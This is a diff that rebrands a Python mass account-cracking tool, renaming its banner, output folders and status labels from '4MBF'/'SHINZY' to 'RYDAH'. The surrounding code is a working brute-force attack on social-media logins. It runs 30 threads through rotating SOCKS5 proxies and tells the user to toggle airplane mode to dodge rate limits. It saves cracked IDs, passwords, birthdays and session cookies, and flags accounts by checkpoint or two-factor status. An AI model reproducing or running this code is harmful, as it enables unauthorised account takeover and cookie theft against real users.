@@ -148,16 +148,15 @@ def banner():
 
 
 	ban='''
-     _____ __  _______   _________  __ 
-    / ___// / / /  _/ | / /__  /\ \/ / 
-   \__ \/ /_/ // //  |/ /  / /  \  /
-  ___// __  // // /|  /  / /__ / /
-/____/_/ /_/___/_/ |_/  /____//_/
-                  ____  _    __              __
-    ____ ___  __  __/ / /_(_)  / /_____  ____  / /____
-   / __ `__ \/ / / / / __/ /  / __/ __ \/ __ \/ / ___/
-  / / / / / / /_/ / / /_/ /  / /_/ /_/ / /_/ / (__  )
-/_/ /_/ /_/\__,_/_/\__/_/   \__/\____/\____/_/____/ '''
+       ___    _     _  ___   _____  _   _     _____        
+ |  _ \ ( )   ( )(  _ \(  _  )( ) ( )   (_   _)/ \_/ \
+ | (_) ) \ \_/ / | | ) | (_) || |_| |   /|| |  |     |
+ |    /    \ /   | | | )  _  )|  _  |  (_)| |  | (_) |
+ | |\ \    | |   | |_) | | | || | | |     | |  | | | |
+ (_) (_)   (_)   (____/(_) (_)(_) (_)     ( )  (_) (_)
+                                          /(          
+                                         (__)        ''' 
+ 
 	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
 	cetak(nel(oi, title='[bold cyan] • DEVELOVER INFORMATION • [/bold cyan]'))
 # VALIDASI TOKEN
@@ -355,7 +354,7 @@ def result():
 	cetak(nel(kis, title='RESULTS'))
 	kz = input(x+'['+p+'f'+x+'] Choose : ')
 	if kz in ['1','01']:
-		try:vin = os.listdir('/sdcard/4MBF-DATA/CP')
+		try:vin = os.listdir('/sdcard/RYDAH-DATA/CP')
 		except FileNotFoundError:
 			gada = '# STORAGE NOT FOUND '
 			sol().print(mark(gada, style='red'))
@@ -372,7 +371,7 @@ def result():
 			cih = 0
 			lol = {}
 			for isi in vin:
-				try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
+				try:hem = open('/sdcard/RYDAH-DATA/CP/'+isi,'r').readlines()
 				except:continue
 				cih+=1
 				if cih<10:
@@ -391,7 +390,7 @@ def result():
 				ric = '# OPTION NOT IN THE MENU'
 				sol().print(mark(ric, style='red'))
 				exit()
-			try:lin = open('/sdcard/4MBF-DATA/CP/'+geh,'r').read().splitlines()
+			try:lin = open('/sdcard/RYDAH-DATA/CP/'+geh,'r').read().splitlines()
 			except:
 				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
 				sol().print(mark(hehe, style='red'))
@@ -446,7 +445,7 @@ def result():
 				ric = '# OPTION NOT IN THE MENU'
 				sol().print(mark(ric, style='red'))
 				exit()
-			try:lin = open('/sdcard/4MBF-DATA/OK/'+geh,'r').read().splitlines()
+			try:lin = open('/sdcard/RYDAH-DATA/OK/'+geh,'r').read().splitlines()
 			except:
 				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
 				sol().print(mark(hehe, style='red'))
@@ -482,7 +481,7 @@ def file():
 	sol().print(mark(teks, style='cyan'))
 	my_files = []
 	try:
-		lis = os.listdir('/sdcard/4MBF-DATA/CP')
+		lis = os.listdir('/sdcard/RYDAH-DATA/CP')
 		for kt in lis:
 			my_files.append(kt)
 	except:pass
@@ -494,9 +493,9 @@ def file():
 		cih = 0
 		lol = {}
 		for isi in my_files:
-			try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
+			try:hem = open('/sdcard/RYDAH-DATA/CP/'+isi,'r').readlines()
 			except:
-				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
+				try:hem = open('/sdcard/RYDAH-DATA/OK/'+isi,'r').readlines()
 				except:continue
 			cih+=1
 			if cih<10:
@@ -516,13 +515,13 @@ def file():
 			sol().print(mark(ric, style='red'))
 			exit()
 		try:
-			hf = open('/sdcard/4MBF-DATA/CP/'+geh,'r').readlines()
+			hf = open('/sdcard/RYDAH-DATA/CP/'+geh,'r').readlines()
 			for fz in hf:
 				akun.append(fz.replace('\n',''))
 			cek_opsi()
 		except IOError:
 			try:
-				hf = open('/sdcard/4MBF-DATA/OK/'+geh,'r').readlines()
+				hf = open('/sdcard/RYDAH-DATA/OK/'+geh,'r').readlines()
 				for fz in hf:
 					akun.append(fz.replace('\n',''))
 				cek_opsi()
@@ -766,7 +765,7 @@ def pulkanid(linkmem):
 def crack_file():
 	cek = '# CRACK FROM FILE DUMP'
 	sol().print(mark(cek, style='green'))
-	try:vin = os.listdir('/sdcard/4MBF-DATA/DUMP')
+	try:vin = os.listdir('/sdcard/Rydah-DATA/DUMP')
 	except FileNotFoundError:
 		gada = '# STORAGE NOT FOUND '
 		sol().print(mark(gada, style='red'))
@@ -783,7 +782,7 @@ def crack_file():
 		cih = 0
 		lol = {}
 		for isi in vin:
-			try:hem = open('/sdcard/4MBF-DATA/DUMP/'+isi,'r').readlines()
+			try:hem = open('/sdcard/Rydah-DATA/DUMP/'+isi,'r').readlines()
 			except:continue
 			cih+=1
 			if cih<10:
@@ -802,7 +801,7 @@ def crack_file():
 			ric = '# OPTION NOT IN THE MENU'
 			sol().print(mark(ric, style='red'))
 			exit()
-		try:lin = open('/sdcard/4MBF-DATA/DUMP/'+geh,'r').read().splitlines()
+		try:lin = open('/sdcard/Rydah-DATA/DUMP/'+geh,'r').read().splitlines()
 		except:
 			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
 			sol().print(mark(hehe, style='red'))
@@ -901,7 +900,7 @@ def setting():
 def passwrd():
 	ler = '# CRACK PROCESS START, PRESS CTRL+Z TO STOP'
 	sol().print(mark(ler, style='green'))
-	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
+	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/RYDAH-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/RYDAH-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
 	cetak(nel(krek, title=' • CRACK • '))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -961,7 +960,7 @@ def crack(idf,pwv,nmf):
 	nip=random.choice(prox)
 	ses=requests.Session()
 	proxs= {'http': 'socks5://'+nip}
-	sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s RYDAH %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
@@ -991,12 +990,12 @@ def crack(idf,pwv,nmf):
 					print('\n')
 					try:
 						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}\n[•] BIRTHDAY : {ttl}'
-						open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
+						open('/sdcard/RYDAH-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
 					except:
 						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
-						open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+						open('/sdcard/RYDAH-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					statuscp1 = nel(statuscp, style='yellow')
-					cetak(nel(statuscp1, title='SHINZY CP'))
+					cetak(nel(statuscp1, title='RYDAH CP'))
 					cp+=1
 				else:continue
 				break
@@ -1005,17 +1004,17 @@ def crack(idf,pwv,nmf):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='SHINZY LIVE'))
+					cetak(nel(statusok1, title='RYDAH LIVE'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1067,7 +1066,7 @@ def crack(idf,pwv,nmf):
 					print('\n')
 					statusok = f'[bold green]\r[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]SHINZY LIVE[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]RYDAH LIVE[/bold green]'))
 					ok+=1
 					break
 
@@ -1107,8 +1106,8 @@ def crackfree(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='yellow')
-					cetak(nel(statuscp1, title='SHINZY CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					cetak(nel(statuscp1, title='RYDAH CP'))
+					open('/sdcard/RYDAH-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1118,17 +1117,17 @@ def crackfree(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='SHINZY LIVE'))
+					cetak(nel(statusok1, title='RYDAH LIVE'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1151,7 +1150,7 @@ def crackfree(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]SHINZY LIVE[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]RYDAH LIVE[/bold green]'))
 					ok+=1
 					break
 
@@ -1191,8 +1190,8 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='yellow')
-					cetak(nel(statuscp1, title='SHINZY CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					cetak(nel(statuscp1, title='RYDAH CP'))
+					open('/sdcard/RYDAH-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1202,17 +1201,17 @@ def cracktouch(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='SHINZY LIVE'))
+					cetak(nel(statusok1, title='RYDAH LIVE'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1235,7 +1234,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]SHINZY LIVE[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]RYDAH LIVE[/bold green]'))
 					ok+=1
 					break
 
@@ -1255,7 +1254,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s RYDAH %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 
@@ -1274,8 +1273,8 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='yellow')
-					cetak(nel(statuscp1, title='SHINZY CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					cetak(nel(statuscp1, title='RYDAH CP'))
+					open('/sdcard/RYDAH-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1285,7 +1284,7 @@ def crackmbasic(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
@@ -1295,7 +1294,7 @@ def crackmbasic(idf,pwv):
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1318,7 +1317,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]RYDAH LIVE[/bold green]'))
 					ok+=1
 					break
 
@@ -1393,18 +1392,18 @@ def cekopsii(id,pw):
 					if opsinya=='':
 						try:
 							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
-							open('/sdcard/4MBF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
+							open('/sdcard/RYDAH-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
 
 						except:
 							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
-							open('/sdcard/4MBF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
+							open('/sdcard/RYDAH-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
 					else:
 						try:
 							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
-							open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
+							open('/sdcard/RYDAH-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
 						except:
 							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
-							open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
+							open('/sdcard/RYDAH-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
 					statusok1 = nel(statusok, style='yellow')
 					cetak(nel(statusok1, title='CHECKPOINT OPTION'))
 				except:
@@ -1418,7 +1417,7 @@ def cekopsii(id,pw):
 					statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}'
 				statusok1 = nel(statusok, style='yellow')
 				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
-				open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
+				open('/sdcard/RYDAH-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
 
 			else:
 				print('\n\r')
@@ -1431,10 +1430,10 @@ def cekopsii(id,pw):
 			sol().print(mark(li, style='red'))
 			exit()
 if __name__=='__main__':
-	try:os.mkdir('/sdcard/4MBF-DATA/CP')
+	try:os.mkdir('/sdcard/RYDAH-DATA/CP')
 	except:pass
-	try:os.mkdir('/sdcard/4MBF-DATA/OK')
+	try:os.mkdir('/sdcard/RYDAH-DATA/OK')
 	except:pass
-	try:os.mkdir('/sdcard/4MBF-DATA/DUMP')
+	try:os.mkdir('/sdcard/RYDAH-DATA/DUMP')
 	except:pass
 	login()
